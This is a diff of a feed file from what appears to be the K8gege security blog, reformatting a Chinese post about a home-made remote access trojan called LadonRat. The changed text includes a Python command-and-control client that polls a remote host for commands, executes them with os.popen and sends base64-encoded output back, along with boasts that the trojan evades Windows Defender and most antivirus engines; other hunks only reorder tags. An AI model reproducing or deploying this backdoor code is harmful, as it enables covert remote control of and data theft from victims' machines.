@@ -1334,7 +1334,15 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 
 
 <h3 id="Base64加密代码"><a href="#Base64加密代码" class="headerlink" title="Base64加密代码"></a>Base64加密代码</h3><p>由于明文传输不支持多行结果，将会导致很多命令无法通过GET方式取回显，所以我们可通过BASE64回传，既不直接暴露CMD结果，也解决了多行结果无法回显问题。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public static string Base64_encodeUTF8(string str)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> Convert.ToBase64String(Encoding.UTF8.GetBytes(str));</span><br><span class="line">&#125;</span><br><span class="line">```	</span><br><span class="line">	</span><br><span class="line">BASE64加密的结果传到Ladon后会自动解密，用IIS、Apache等无此功能(省去脚本编写)</span><br><span class="line">![image](http://k8gege.org/k8img/posts/ladonrat/Ladon_rat2.PNG)		</span><br><span class="line"></span><br><span class="line"><span class="comment">### win10 Defender免杀</span></span><br><span class="line"></span><br><span class="line">测试win10最新版defender轻松免杀</span><br><span class="line">![image](http://k8gege.org/k8img/posts/ladonrat/win10_av.gif)	</span><br><span class="line"></span><br><span class="line"><span class="comment">### 免杀virscan所有杀软</span></span><br><span class="line">![image](http://k8gege.org/k8img/posts/ladonrat/bypass_allav.PNG)</span><br><span class="line"></span><br><span class="line">https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9</span><br><span class="line"></span><br><span class="line">显然很多杀软很垃圾的，对于自己写的RAT依旧轻松免杀,所以那些说自己写的没几个人用的非公开马只能过一两个杀软认为自己牛B的，其实免杀水平都不怎样。当你写个公开的工具且很多人使用，依旧能免杀才叫牛，不是写一个没几个人用的东西免杀几个月还认为免杀牛逼，忽悠不会写马的菜B认为免杀难的差不多。你免杀别人公开的大量人用的东西当然难，不公开的东西可能并不需要怎么修改都免杀，功能越少越容易做，难个蛋蛋。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 以色列杀软牛B</span></span><br><span class="line"></span><br><span class="line">突然想起还有一个杀软网站，测试后发现来自以色列的杀软第一个杀了，这种出现HTTP请求和CMD执行的，那些不杀的杀软，至少也要报个可疑才对。居然不报，还是以色列牛逼</span><br><span class="line">![image](http://k8gege.org/k8img/posts/ladonrat/cbereason_kill.PNG)</span><br><span class="line">https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection</span><br><span class="line"></span><br><span class="line"><span class="comment">### Python实现C2</span></span><br><span class="line"></span><br><span class="line">```Bash</span><br><span class="line">import urllib2</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="comment">### http://k8gege.org/p/40523.html</span></span><br><span class="line">def cscheat():</span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.250.27:800/cmd.txt"</span>)</span><br><span class="line">	cmd = res.read()</span><br><span class="line">	<span class="built_in">print</span> cmd</span><br><span class="line">	result = os.popen(cmd)  </span><br><span class="line">	res = result.read() </span><br><span class="line">	cmdResult=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> res.splitlines():  </span><br><span class="line">		cmdResult+=line+<span class="string">"\r\n"</span></span><br><span class="line">	<span class="built_in">print</span> cmdResult</span><br><span class="line">	<span class="comment">#opener.open("http://192.168.250.27:800/getstr/"+cmdResult)</span></span><br><span class="line">	opener.open(<span class="string">"http://192.168.250.27:800/deb64/"</span>+base64.b64encode(cmdResult))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:    </span><br><span class="line">	<span class="built_in">print</span>(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(5)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public static string Base64_encodeUTF8(string str)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> Convert.ToBase64String(Encoding.UTF8.GetBytes(str));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>BASE64加密的结果传到Ladon后会自动解密，用IIS、Apache等无此功能(省去脚本编写)<br><img alt="image" data-original="http://k8gege.org/k8img/posts/ladonrat/Ladon_rat2.PNG">        </p>
+<h3 id="win10-Defender免杀"><a href="#win10-Defender免杀" class="headerlink" title="win10 Defender免杀"></a>win10 Defender免杀</h3><p>测试win10最新版defender轻松免杀<br><img alt="image" data-original="http://k8gege.org/k8img/posts/ladonrat/win10_av.gif">    </p>
+<h3 id="免杀virscan所有杀软"><a href="#免杀virscan所有杀软" class="headerlink" title="免杀virscan所有杀软"></a>免杀virscan所有杀软</h3><p><img alt="image" data-original="http://k8gege.org/k8img/posts/ladonrat/bypass_allav.PNG"></p>
+<p><a href="https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9" target="_blank" rel="noopener">https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9</a></p>
+<p>显然很多杀软很垃圾的，对于自己写的RAT依旧轻松免杀,所以那些说自己写的没几个人用的非公开马只能过一两个杀软认为自己牛B的，其实免杀水平都不怎样。当你写个公开的工具且很多人使用，依旧能免杀才叫牛，不是写一个没几个人用的东西免杀几个月还认为免杀牛逼，忽悠不会写马的菜B认为免杀难的差不多。你免杀别人公开的大量人用的东西当然难，不公开的东西可能并不需要怎么修改都免杀，功能越少越容易做，难个蛋蛋。</p>
+<h3 id="以色列杀软牛B"><a href="#以色列杀软牛B" class="headerlink" title="以色列杀软牛B"></a>以色列杀软牛B</h3><p>突然想起还有一个杀软网站，测试后发现来自以色列的杀软第一个杀了，这种出现HTTP请求和CMD执行的，那些不杀的杀软，至少也要报个可疑才对。居然不报，还是以色列牛逼<br><img alt="image" data-original="http://k8gege.org/k8img/posts/ladonrat/cbereason_kill.PNG"><br><a href="https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection</a></p>
+<h3 id="Python实现C2"><a href="#Python实现C2" class="headerlink" title="Python实现C2"></a>Python实现C2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="comment">### http://k8gege.org/p/40523.html</span></span><br><span class="line">def cscheat():</span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.250.27:800/cmd.txt"</span>)</span><br><span class="line">	cmd = res.read()</span><br><span class="line">	<span class="built_in">print</span> cmd</span><br><span class="line">	result = os.popen(cmd)  </span><br><span class="line">	res = result.read() </span><br><span class="line">	cmdResult=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> res.splitlines():  </span><br><span class="line">		cmdResult+=line+<span class="string">"\r\n"</span></span><br><span class="line">	<span class="built_in">print</span> cmdResult</span><br><span class="line">	<span class="comment">#opener.open("http://192.168.250.27:800/getstr/"+cmdResult)</span></span><br><span class="line">	opener.open(<span class="string">"http://192.168.250.27:800/deb64/"</span>+base64.b64encode(cmdResult))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:    </span><br><span class="line">	<span class="built_in">print</span>(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(5)</span><br></pre></td></tr></table></figure>
 
 
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>本文完整代码LadonRat.rar，在K8小密圈可下载</p>
@@ -3451,11 +3459,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5673,8 +5681,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </categories>
       <tags>
         <tag>Exp</tag>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
       </tags>
   </entry>
@@ -6021,17 +6029,17 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>嗅探</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
       </tags>
   </entry>
